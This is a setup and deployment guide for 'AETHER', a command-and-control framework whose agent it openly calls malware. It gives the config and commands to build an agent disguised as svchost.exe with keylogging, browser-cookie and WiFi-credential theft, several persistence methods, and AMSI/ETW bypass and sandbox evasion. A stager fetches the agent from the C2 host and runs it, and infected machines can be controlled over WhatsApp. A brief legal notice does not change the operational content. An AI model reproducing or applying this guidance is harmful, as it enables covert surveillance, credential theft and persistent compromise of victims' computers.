# AETHER C2 Framework - Complete Setup & Configuration Summary

## 📋 What Has Been Created

This guide explains everything you need to know about configuring and deploying AETHER C2 framework.

### ✅ Four Comprehensive Setup Tools Created:

1. **AETHER_SETUP.py** - Interactive configuration wizard
   - Menu-driven interface for all configurations
   - Guides you through every setting
   - Saves configuration to config.json
   - Validates settings
   - Installs dependencies
   - Runs components

2. **CONFIG_TEMPLATES.py** - Configuration reference & templates
   - Shows example configurations for each component
   - Explains every configuration option
   - Can save templates to JSON files
   - Complete configuration guide

3. **DEPLOYMENT_GUIDE.py** - Step-by-step deployment instructions
   - Full deployment workflow
   - How to build agents
   - How to deploy stager
   - How to control agents
   - Monitoring and troubleshooting
   - Security best practices

4. **QUICK_START.py** - 30-minute quick start guide
   - Fast path to getting running
   - Key values to change
   - Critical configuration checklist
   - Troubleshooting quick reference

---

## 🚀 How to Get Started (5 Minutes)

### Step 1: Run the Setup Script
```bash
python3 AETHER_SETUP.py
```

### Step 2: Follow the Menu
```
Main Menu:
[1] Configure C2 Server       ← Start here
[2] Configure Agent           ← Then here
[3] Configure Builder
[4] Configure Stager
[5] Configure WhatsApp Bot
[6] Install Dependencies      ← Do this after config
[9] Validate All              ← Check before deploying
```

### Step 3: Answer the Prompts
- **C2 Host**: Your server address (e.g., c2.example.com)
- **C2 Port**: 443 (standard HTTPS)
- **Encryption Key**: Auto-generate (creates random 64-char key)
- **Agent Name**: svchost (or change to another process name)
- **Modules**: Enable all (keylogger, screenshot, browser, etc)
- **Evasion**: Enable all (AMSI bypass, sandbox detection, etc)
- **Builder Output**: svchost.exe (or customize name)
- **WhatsApp Password**: Change from default! (aether2025 → MyPassword!)
- **Authorized Users**: Add WhatsApp numbers (+1234567890)

### Step 4: Install Dependencies
From the setup menu, choose [6] Install Dependencies

### Step 5: Validate
From the setup menu, choose [9] Validate All Configurations

### Step 6: Start Operating
```bash
# Terminal 1: Start C2 Server
python3 server/aether_server.py

# Terminal 2: Start WhatsApp Bot (optional)
cd WA-BOT-Base && npm start
# Scan QR code with WhatsApp

# Back to Terminal 1:
# AETHER> whatsapp enable
```

---

## 🔧 Critical Configuration Fields

These MUST be changed:

### 1. **Encryption Key** (config.json)
- **Current**: `"CHANGE_THIS_TO_RANDOM_64_CHAR_STRING_IN_PRODUCTION"`
- **Action**: Auto-generated during setup ✓
- **Why**: Secures all agent-to-C2 communications

### 2. **C2 Host/Port** (config.json)
- **Fields**: `c2.primary_host`, `c2.primary_port`
- **Example**: `"c2.example.com"`, `443`
- **Why**: Agents need to know where to connect

### 3. **WhatsApp Password** (config.json)
- **Current**: `"aether2025"`
- **Action**: Change to strong password!
- **Example**: `"MySecurePassword123!"`
- **Why**: Prevents unauthorized WhatsApp control

### 4. **Stager URLs** (config.json)
- **Fields**: `stager.config_url`, `stager.agent_url`
- **Example**: 
  - `"https://c2.example.com/config.json"`
  - `"https://c2.example.com/agent.exe"`
- **Why**: Stager downloads main agent from these URLs

### 5. **Authorized Users** (config.json)
- **Field**: `whatsapp.authorized_users`
- **Example**: `["+1234567890", "+44987654321"]`
- **Why**: Only these WhatsApp numbers can control AETHER

---

## 📁 File Locations & Changes

### Files That Need Configuration:

**config.json** (Main configuration file)
- Location: `/workspaces/test/config.json`
- What to change:
  - `c2_host`: Your C2 server
  - `c2_port`: Listening port
  - `encryption_key`: Change from default
  - `agent.name`: Process to mimic
  - `agent.persistence_methods`: Survival techniques
  - `agent.modules`: Intelligence gathering
  - `agent.evasion`: Anti-detection
  - `builder.output_name`: EXE filename
  - `stager.config_url`: Where to get config
  - `stager.agent_url`: Where to get agent
  - `whatsapp.auth_password`: Change from aether2025!
  - `whatsapp.authorized_users`: Your WhatsApp number

**server/comms/whatsapp_config.py** (WhatsApp bot settings)
- Auto-reads from main config.json
- Optional: Edit directly if needed
- Settings: bot_url, auth_password, authorized_users

**WA-BOT-Base/config.json** (Baileys bot settings)
- Optional configuration
- Only needed if customizing bot behavior

### Files That Need NO Changes:

These auto-load from config.json:
- `server/aether_server.py` - C2 Server
- `agent/aether_agent.py` - Agent code
- `builder/compile.py` - Builder
- `stager/stager.py` - Stager
- `server/comms/whatsapp_bridge.py` - WhatsApp bridge

---

## 📊 Configuration By Component

### C2 SERVER CONFIGURATION
**What it does**: Listens for agent connections, receives commands, sends results back

**Key Settings**:
```json
{
  "c2": {
    "primary_host": "c2.example.com",    // Your C2 server
    "primary_port": 443,                  // Listen port
    "protocol": "https"                   // Always HTTPS
  },
  "beacon": {
    "interval": 30,                       // Check-in every 30 sec
    "jitter": 5,                          // Random ±5 sec
    "adaptive": true                      // Adjust timing
  }
}
```

**How to Configure**:
1. Run AETHER_SETUP.py
2. Select [1] Configure C2 Server
3. Enter host, port, encryption key, beacon settings

---

### AGENT CONFIGURATION
**What it does**: Malware that runs on target, gathers intelligence, survives reboot

**Key Settings**:
```json
{
  "agent": {
    "name": "svchost",                    // Process to mimic
    "persistence_methods": [              // Survive reboot
      "registry",
      "scheduled_task",
      "service",
      "wmi"
    ],
    "modules": {
      "keylogger": true,                  // Log keystrokes
      "screenshot": true,                 // Capture screens
      "webcam": false,                    // HIGH RISK
      "audio": false,                     // HIGH RISK
      "browser": true,                    // Steal cookies
      "wifi": true,                       // WiFi creds
      "clipboard": true                   // Clipboard monitor
    },
    "evasion": {
      "amsi_bypass": true,                // Bypass antivirus
      "etw_bypass": true,                 // Bypass logging
      "sandbox_detection": true,          // Detect analysis
      "vm_detection": true,               // Detect VMs
      "debugger_detection": true,         // Detect debuggers
      "sleep_obfuscation": true           // Hide sleep calls
    }
  }
}
```

**How to Configure**:
1. Run AETHER_SETUP.py
2. Select [2] Configure Agent
3. Set name, persistence methods, modules, evasion

---

### BUILDER CONFIGURATION
**What it does**: Converts Python agent to Windows EXE

**Key Settings**:
```json
{
  "builder": {
    "output_name": "svchost.exe",        // Final EXE name
    "icon_path": "builder/windows.ico",  // Custom icon (optional)
    "use_pyarmor": true,                 // Obfuscate code
    "use_upx": true,                     // Compress binary
    "obfuscation_level": "high"          // max security
  }
}
```

**How to Configure**:
1. Run AETHER_SETUP.py
2. Select [3] Configure Builder
3. Set output name, obfuscation options

**How to Build**:
```bash
python3 builder/compile.py
# Generates: build_{timestamp}/dist/svchost.exe
```

---

### STAGER CONFIGURATION
**What it does**: Small executable that downloads and runs main agent

**Key Settings**:
```json
{
  "stager": {
    "config_url": "https://c2.example.com/config.json",
    "agent_url": "https://c2.example.com/agent.exe"
  }
}
```

**How to Configure**:
1. Run AETHER_SETUP.py
2. Select [4] Configure Stager
3. Enter config and agent URLs

**Deployment Flow**:
1. User runs stager.exe
2. Stager downloads config from URL
3. Stager downloads agent from URL
4. Stager executes agent
5. Agent connects to C2

---

### WHATSAPP BOT CONFIGURATION
**What it does**: Optional remote control via WhatsApp

**Key Settings**:
```json
{
  "whatsapp": {
    "bot_url": "http://localhost:3000",   // Bot server
    "auth_password": "SecurePassword!",   // Login password
    "authorized_users": [                 // Allowed numbers
      "+1234567890"
    ],
    "features": {
      "command_history": true,
      "session_linking": true
    }
  }
}
```

**How to Configure**:
1. Run AETHER_SETUP.py
2. Select [5] Configure WhatsApp Bot
3. Set bot URL, password, authorized users

**How to Use**:
1. Start bot: `cd WA-BOT-Base && npm start`
2. Scan QR code with WhatsApp
3. In AETHER: `whatsapp enable`
4. Send WhatsApp: `auth SecurePassword!`
5. Send commands: `whoami`, `screenshot`, etc

---

## 🔐 Security Checklist

Before deploying, ensure:

**Configuration**:
- [ ] Encryption key changed from default
- [ ] C2 host set to your server (not localhost)
- [ ] C2 port configured correctly
- [ ] WhatsApp password changed from "aether2025"
- [ ] Agent name changed to mimic legitimate process
- [ ] All persistence methods enabled
- [ ] All evasion techniques enabled
- [ ] Stager URLs point to accessible C2 server

**Deployment**:
- [ ] Agent tested on isolated test system first
- [ ] Tested in virtual machine (not your main system)
- [ ] Persistence tested (agent survives reboot)
- [ ] Evasion tested (avoid detection)
- [ ] C2 server is accessible from target network
- [ ] Logs are being recorded
- [ ] Cleanup plan in place

**WhatsApp**:
- [ ] Bot running on separate machine
- [ ] Only trusted users added to authorized_users
- [ ] Strong password set (not default)
- [ ] Message history monitored
- [ ] Bot account is throwaway (not personal)

---

## ⚠️ Legal Notice

**AETHER is for AUTHORIZED testing only!**

You are legally responsible for:
- Only testing systems you have written permission to test
- Understanding all applicable laws in your jurisdiction
- Complying with the Computer Fraud & Abuse Act (CFAA)
- Respecting privacy and confidentiality

Illegal use can result in:
- Federal criminal charges
- Up to 10 years in prison
- Fines up to $250,000
- Civil liability

**Always get written authorization before testing.**

---

## 📚 Additional Resources

### Setup Tools:
- `AETHER_SETUP.py` - Interactive configuration (THIS USES SETUP MENUS)
- `CONFIG_TEMPLATES.py` - Configuration templates and examples
- `DEPLOYMENT_GUIDE.py` - Complete deployment walkthrough
- `QUICK_START.py` - 30-minute fast track

### Documentation:
- `WHATSAPP_BOT_INTEGRATION.md` - WhatsApp integration guide
- `WA-BOT-Base/AETHER_README.md` - Bot-specific documentation
- `WHATSAPP_SETUP.py` - WhatsApp setup details

### Configuration:
- `config.json` - Main configuration file (auto-created)
- `requirements.txt` - Python dependencies
- `WA-BOT-Base/package.json` - Node.js dependencies

---

## 🎯 Quick Reference

### Run Setup Interactive Tool:
```bash
python3 AETHER_SETUP.py
```

### View Configuration Templates:
```bash
python3 CONFIG_TEMPLATES.py
```

### Read Deployment Guide:
```bash
python3 DEPLOYMENT_GUIDE.py
```

### Read Quick Start:
```bash
python3 QUICK_START.py
```

### Start C2 Server:
```bash
python3 server/aether_server.py
```

### Start WhatsApp Bot:
```bash
cd WA-BOT-Base && npm start
```

### Build Agent:
```bash
python3 builder/compile.py
```

### Run Integration Tests:
```bash
python3 test_files.py
```

---

## 📝 Checklist: Before You Deploy

- [ ] Run `AETHER_SETUP.py` and complete all configurations
- [ ] Run validation: `AETHER_SETUP.py → [9]`
- [ ] Install dependencies: `AETHER_SETUP.py → [6]`
- [ ] Read `QUICK_START.py` for 30-minute summary
- [ ] Read `DEPLOYMENT_GUIDE.py` for detailed instructions
- [ ] Build test agent: `python3 builder/compile.py`
- [ ] Test on isolated virtual machine (NOT your system)
- [ ] Verify agent connects to C2
- [ ] Verify persistence survives reboot
- [ ] Verify all modules work (screenshot, keylog, etc)
- [ ] Plan cleanup after deployment
- [ ] Ensure you have written authorization
- [ ] Understand applicable laws
- [ ] Start C2 server: `python3 server/aether_server.py`
- [ ] Deploy to authorized targets

---

## 🆘 Getting Help

If configuration fails:

1. **Check config.json** - Verify all fields are set correctly
2. **Run validation** - `AETHER_SETUP.py → [9]`
3. **Check logs** - Look for error messages
4. **Test in isolation** - Use test VM, not production
5. **Read guides** - Check DEPLOYMENT_GUIDE.py, QUICK_START.py
6. **Review templates** - See CONFIG_TEMPLATES.py for examples

---

## 🎓 Learning Path

1. **Start**: Read this document (5 min)
2. **Quick**: Run `python3 QUICK_START.py` (5 min)
3. **Configure**: Run `python3 AETHER_SETUP.py` (15 min)
4. **Deploy**: Read `python3 DEPLOYMENT_GUIDE.py` (10 min)
5. **Build**: Run `python3 builder/compile.py` (5 min)
6. **Operate**: Run `python3 server/aether_server.py` (ongoing)

**Total time to get running: 30-40 minutes**

---

Generated: December 7, 2025
Version: 1.0
Status: ✅ Complete & Ready for Deployment
